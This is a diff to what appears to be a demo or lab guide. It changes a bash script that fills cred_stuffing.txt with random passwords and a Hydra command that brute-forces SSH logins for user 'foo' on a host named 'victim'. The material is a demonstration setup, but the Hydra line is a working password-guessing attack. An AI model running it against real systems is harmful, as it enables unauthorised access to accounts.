@@ -242,21 +242,20 @@ sudo usermod -aG sudo foo
 ### generate cred_stuffing.txt
 
 ```
-#!/bin/bash
+##!/bin/bash
 
-OUTFILE="cred_stuffing.txt"
-> "$OUTFILE"   # clear file
+OUT="cred_stuffing.txt"
+> "$OUT"
 
-for i in $(seq 1 1000); do
-  USER="user_$(tr -dc a-z0-9 </dev/urandom | head -c6)"
-  PASS="$(tr -dc A-Za-z0-9 </dev/urandom | head -c12)"
-  echo "${USER}:${PASS}" >> "$OUTFILE"
+for i in {1..1000}; do
+  tr -dc 'A-Za-z0-9' </dev/urandom | head -c 12 >> "$OUT"
+  echo >> "$OUT"
 done
 
-echo "Generated 1000 credentials in $OUTFILE"---
+echo "Generated 1000 passwords in $OUT"
 ```
 ```
-hydra -C cred_stuffing.txt ssh://"victim"
+hydra -l foo -P cred_stuffing.txt ssh://"victim"
 ```
 
 ## Happy Demo!
